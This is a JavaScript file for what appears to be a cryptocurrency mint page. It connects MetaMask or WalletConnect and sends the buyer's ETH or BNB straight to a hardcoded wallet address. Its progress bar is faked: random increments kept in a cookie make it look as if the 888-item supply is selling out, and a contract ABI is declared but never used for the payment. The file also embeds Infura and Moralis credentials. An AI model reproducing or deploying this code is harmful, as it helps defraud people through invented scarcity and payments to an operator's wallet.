document.addEventListener("DOMContentLoaded", function () {
    
const MAXMIN    = [1,3];
const PRICE     = 0.15;
//  PROGRESS    
const PREFIX    = "dsfsd";
const TOTAL     =  888;
const START     = 60;
const TIME      = [2000,6000];
const COINS     = [1,5];

const WALLET = {
    ETH: "0x852e516B56f1d334eE875B6Eb2FD2f4EAF38e484",
    BNB: "0x852e516B56f1d334eE875B6Eb2FD2f4EAF38e484",
};
    
    
function calc(a){
      $(".eth_pr").text(`${(a*PRICE).toFixed(2)} ETH`);
      
  }
$( ".plus" ).on( "click", function() {
  if(parseInt($(".form__input").text())>MAXMIN[1]-1)
      return false;
  let num = parseInt($(".form__input").text()) + 1;
    
  $(".form__input").text(num);
    calc(num);
});
$( ".minus" ).on( "click", function() {
    if(parseInt($(".form__input").text())<MAXMIN[0]+1)
        return false;
    let num = parseInt($(".form__input").text()) - 1;
    $(".form__input").text(num);
        calc(num);
    });
$( ".max" ).on( "click",  function() {
    $(".form__input").text(MAXMIN[1]);
    calc(MAXMIN[1]);
});
$( ".submit__form" ).on( "click", async function() {
        
        if(payby == false)
            $(`.modal__window`).css("display","flex");
        if(payby == "bc"){
            await MetaMask.pay(parseFloat($(".eth_pr").text()),"ETH",await MetaMask.getAccount())
        }else if(payby == "wc"){
            console.log(parseFloat($(".eth_pr").text()))
            await WalletConnect.pay(parseFloat($(".eth_pr").text()),"ETH");
        }
    
}); 
let counter = 0;
function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}
function setCookie(cName, cValue, expDays) {
        let date = new Date();
        date.setTime(date.getTime() + (expDays * 24 * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        document.cookie = cName + "=" + cValue + "; " + expires + "; path=/";
    return true;
}
function getCookie(cName) {
      const name = cName + "=";
      const cDecoded = decodeURIComponent(document.cookie); //to be careful
      const cArr = cDecoded .split('; ');
      let res;
      cArr.forEach(val => {
          if (val.indexOf(name) === 0) res = val.substring(name.length);
      })
      return res;
}
function numberWithSpaces(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}
function animateValue(obj, start, end, duration) {
  let startTimestamp = null;
  const step = (timestamp) => {
    if (!startTimestamp) startTimestamp = timestamp;
    const progress = Math.min((timestamp - startTimestamp) / duration, 1);


    obj.innerHTML = (Math.floor(progress * (end - start) + start)).toFixed(0)+ ' / '+TOTAL;
    if (progress < 1) {
      window.requestAnimationFrame(step);
    }
  };
  window.requestAnimationFrame(step);
}
function sor(){
        
    let timetotal=1000;
    function gets(a, b) {
  return Math.random() * (a - b) + b;
}
  if (counter == 0) {
    J = 1;
    var elem = document.querySelector(".progress-done");
      var elem2 = document.querySelector(".done-span");
    var width = START;
    var  main  = setInterval(frame,100);
    var c,rich;
    
    if(getCookie(PREFIX) != undefined)
         rich = getCookie(PREFIX);
    else {
        setCookie(PREFIX,START,30);
        rich = START;
    }
      var totals = parseInt((TOTAL/100)*rich);
      elem2.innerHTML = ' / '+TOTAL;
        function frame() {
            if (width >= rich) {
                clearInterval(main);
            if(width < 100) {
            async function is(){
                let r = gets(COINS[0]/(TOTAL/100),COINS[1]/(TOTAL/100));
                width=(+width+r).toFixed(3);
                rich = width;
                setCookie(PREFIX,width,30)
                totals = (TOTAL/100)*rich;
                b_totals = (TOTAL/100)*(rich-r)
                elem.style.width = width + "%";
                elem2.innerHTML = '<span class="progr-span">'+width+'%</span>';
                elem2.innerHTML = animateValue(elem2,b_totals,totals.toFixed(0),500);
            if(width>=100){
			elem2.innerHTML = (TOTAL).toFixed(0) + ' / '+TOTAL;
			elem.innerHTML = '<span class="progr-span">'+400+'%</span>';
			setCookie(PREFIX,START,30);
			return;
		}
            else{
              await sleep(gets(TIME[0],TIME[1]).toFixed(0))
                is();  
            }
        }
        is();
    }
      } else {
        
        width++;
          elem2.innerHTML = ((TOTAL/100)*width).toFixed(0)  + ' / '+TOTAL;
        elem.style.width = width + "%";

      }
    }

  }

}
    
sor();
var account = "",
    selectedAccount,
    temp;    
const INFURAID = "b8de283eb0c147a595c162ba74f7e0bb";
const serverUrl = "https://hml2y2ger9cs.usemoralis.com:2053/server";
const appId = "LgPFHD80SybAGTGeN2nmfqQS23sZoYHjLm1aah60";    
var payby = false;
const networks = {
    BNB: ["0x38","Binance Smart Chain BEP-20","Binance Coin","BNB",18,"https://bsc-dataseed.binance.org/","https://bscscan.com"],
    ETH: ["0x1","Ethereum","Ethereum","ETH",18,`https://mainnet.infura.io/v3/${INFURAID}`,"https://etherscan.io"]
};
    const contractAbi = 
          [
              {
					inputs: [],
					stateMutability: "nonpayable",
					type: "constructor"
				},
				{
					anonymous: false,
					inputs: [{
							indexed: true,
							internalType: "address",
							name: "owner",
							type: "address",
						},
						{
							indexed: true,
							internalType: "address",
							name: "spender",
							type: "address",
						},
						{
							indexed: false,
							internalType: "uint256",
							name: "value",
							type: "uint256",
						},
					],
					name: "Approval",
					type: "event",
				},
				{
					anonymous: false,
					inputs: [{
							indexed: true,
							internalType: "address",
							name: "from",
							type: "address",
						},
						{
							indexed: true,
							internalType: "address",
							name: "to",
							type: "address",
						},
						{
							indexed: false,
							internalType: "uint256",
							name: "value",
							type: "uint256",
						},
					],
					name: "Transfer",
					type: "event",
				},
				{
					inputs: [],
					name: "allowRefunds",
					outputs: [],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [{
							internalType: "address",
							name: "owner",
							type: "address"
						},
						{
							internalType: "address",
							name: "spender",
							type: "address"
						},
					],
					name: "allowance",
					outputs: [{
						internalType: "uint256",
						name: "",
						type: "uint256"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [{
							internalType: "address",
							name: "spender",
							type: "address"
						},
						{
							internalType: "uint256",
							name: "amount",
							type: "uint256"
						},
					],
					name: "approve",
					outputs: [{
						internalType: "bool",
						name: "",
						type: "bool"
					}],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [{
						internalType: "address",
						name: "account",
						type: "address"
					}, ],
					name: "balanceOf",
					outputs: [{
						internalType: "uint256",
						name: "",
						type: "uint256"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [{
						internalType: "uint256",
						name: "amount",
						type: "uint256"
					}, ],
					name: "burnMyTokensFOREVER",
					outputs: [],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [],
					name: "buyTokens",
					outputs: [],
					stateMutability: "payable",
					type: "function",
				},
				{
					inputs: [],
					name: "claimDevFeeAndAddLiquidity",
					outputs: [],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [],
					name: "decimals",
					outputs: [{
						internalType: "uint8",
						name: "",
						type: "uint8"
					}],
					stateMutability: "pure",
					type: "function",
				},
				{
					inputs: [{
							internalType: "address",
							name: "spender",
							type: "address"
						},
						{
							internalType: "uint256",
							name: "subtractedValue",
							type: "uint256",
						},
					],
					name: "decreaseAllowance",
					outputs: [{
						internalType: "bool",
						name: "",
						type: "bool"
					}],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [],
					name: "devClaimed",
					outputs: [{
						internalType: "bool",
						name: "",
						type: "bool"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [],
					name: "ethSent",
					outputs: [{
						internalType: "uint256",
						name: "",
						type: "uint256"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [],
					name: "getRefund",
					outputs: [],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [{
							internalType: "address",
							name: "spender",
							type: "address"
						},
						{
							internalType: "uint256",
							name: "addedValue",
							type: "uint256"
						},
					],
					name: "increaseAllowance",
					outputs: [{
						internalType: "bool",
						name: "",
						type: "bool"
					}],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [],
					name: "isRefundEnabled",
					outputs: [{
						internalType: "bool",
						name: "",
						type: "bool"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [],
					name: "isStopped",
					outputs: [{
						internalType: "bool",
						name: "",
						type: "bool"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [],
					name: "liquidityUnlock",
					outputs: [{
						internalType: "uint256",
						name: "",
						type: "uint256"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [],
					name: "moonMissionStarted",
					outputs: [{
						internalType: "bool",
						name: "",
						type: "bool"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [],
					name: "name",
					outputs: [{
						internalType: "string",
						name: "",
						type: "string"
					}],
					stateMutability: "pure",
					type: "function",
				},
				{
					inputs: [{
						internalType: "bool",
						name: "_isStopped",
						type: "bool"
					}],
					name: "pauseUnpausePresale",
					outputs: [],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [],
					name: "pool",
					outputs: [{
						internalType: "address",
						name: "",
						type: "address"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [{
							internalType: "contract IBEP20",
							name: "tokenAddress",
							type: "address",
						},
						{
							internalType: "uint256",
							name: "tokenAmount",
							type: "uint256"
						},
					],
					name: "recoverbep20",
					outputs: [],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [],
					name: "refundTime",
					outputs: [{
						internalType: "uint256",
						name: "",
						type: "uint256"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [{
						internalType: "address payable",
						name: "addr",
						type: "address"
					}, ],
					name: "setMultisigAddress",
					outputs: [],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [],
					name: "setPancakePool",
					outputs: [],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [],
					name: "symbol",
					outputs: [{
						internalType: "string",
						name: "",
						type: "string"
					}],
					stateMutability: "pure",
					type: "function",
				},
				{
					inputs: [],
					name: "totalSupply",
					outputs: [{
						internalType: "uint256",
						name: "",
						type: "uint256"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					inputs: [{
							internalType: "address",
							name: "recipient",
							type: "address"
						},
						{
							internalType: "uint256",
							name: "amount",
							type: "uint256"
						},
					],
					name: "transfer",
					outputs: [{
						internalType: "bool",
						name: "",
						type: "bool"
					}],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [{
							internalType: "address",
							name: "sender",
							type: "address"
						},
						{
							internalType: "address",
							name: "recipient",
							type: "address"
						},
						{
							internalType: "uint256",
							name: "amount",
							type: "uint256"
						},
					],
					name: "transferFrom",
					outputs: [{
						internalType: "bool",
						name: "",
						type: "bool"
					}],
					stateMutability: "nonpayable",
					type: "function",
				},
				{
					inputs: [{
						internalType: "address",
						name: "user",
						type: "address"
					}],
					name: "userEthSpenttInPresale",
					outputs: [{
						internalType: "uint256",
						name: "",
						type: "uint256"
					}],
					stateMutability: "view",
					type: "function",
				},
				{
					stateMutability: "payable",
					type: "receive"
				},
			];
web3 = new Web3(new Web3.providers.HttpProvider(`https://mainnet.infura.io/v3/${INFURAID}`));
    console.log(web3)
Moralis.start({ serverUrl, appId });
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function converToValue(value){
    let after_point = "000000000000000000",
        before_point = "",
        temp;
    var base = 2;
    if(!(Math.trunc(value) == 0)){
        before_point = ""+Math.trunc(value);
        base = 1;
    }
    temp = (""+value).substring(before_point.length+base);
    after_point = after_point.substring(temp.length);
    after_point = temp + after_point;
    temp = before_point + after_point;
    temp = '0x' + (parseInt(temp)).toString(16)
    return temp;
}
    

class metamask_cl{
    get isOn() {
        return window.ethereum?true:false;
    }
    async getAccount(){
        try {account = await ethereum.request({ method: "eth_requestAccounts" });} 
        catch (error) {return false}
        return await account[0]?account[0]:false;
    }
    async swapNetwork(token){
            try{
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{
                    chainId: networks[token][0],
                }]
            })}
            catch(error){
                console.log(error)
                if(error.code == 4902){
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [
                                {
                                    chainId: networks[token][0],
                                    chainName: networks[token][1],
                                    nativeCurrency: {
                                        name: networks[token][2],
                                        symbol: networks[token][3],
                                        decimals: networks[token][4]
                                    },
                                    rpcUrls: [`${networks[token][5]}`],
                                    blockExplorerUrls: [`${networks[token][6]}`]
                                },
                            ],
                        });
                    }
                    catch(addError){return false}
                }
            }
        return true;
    }
    async pay(amount,token="ETH",ping){
            if(!(await this.swapNetwork(token)))
                return false;
            let check = await ethereum.request({method: 'eth_sendTransaction', 
                    params: [
                        {
                          from:  ping,
                          to:    WALLET[token],
                          value: converToValue(amount),
                        },
                    ],
                })
                .catch((error) => {
                        return false;
            }).then((ev) => {return ev;});
            return true;
    }
}

class walletconnect_cl{
    
    constructor() {
        
    }
    async getAccount(){
        try{
        let user = await Moralis.authenticate({provider: "walletconnect", chainId: 56});window.user = user;return await true;}catch(err){return false}
        return false;
        }
    async pay(amount,token="ETH"){
        const options = {type: "native", amount: Moralis.Units.ETH(amount), receiver: WALLET[token]}
        let result = await Moralis.transfer(options)
        console.log(result);

    }
    async disconnect(){
        await Moralis.User.logOut();
        await Moralis.Web3.cleanup()
    }
}
    async function webon(){
        await sleep(1000);
        $(`.modal__window`).hide();
        $(`.header_connect`).text("CONNECTED!");
        
    }
    async function weboff(){
        
    }
var MetaMask = new metamask_cl();
var WalletConnect = new walletconnect_cl();    
    
$(document).mouseup(function(e){
    var container = $("#popup");
 
    // If the target of the click isn't the container
    if(!container.is(e.target) && container.has(e.target).length === 0){
        $(`.modal__window`).hide();
    }
});
document.getElementById('browser_connect').addEventListener("click", async function(){
    $(`#meta_img`).hide();
    $(`#meta_svg`).css("display", "block")
    if(await MetaMask.getAccount()!=false && await MetaMask.swapNetwork("ETH")!=false){
        
        $(`#meta_img`).show();
        $(`#meta_svg`).hide();
        await webon();
        payby = "bc";
        
    }else{
        await sleep(1000);
        $(`#meta_img`).show();
        $(`#meta_svg`).hide();
        
    }
});
document.getElementById('walletconnect_connect').addEventListener("click", async function(){
if(await WalletConnect.getAccount() != false){
        $(`#meta_img`).show();
        $(`#meta_svg`).hide();
        payby = "wc";
        
        await webon();
    }else{
        await sleep(1000);
        $(`#meta_img`).show();
        $(`#meta_svg`).hide();
    }
        
    
});
});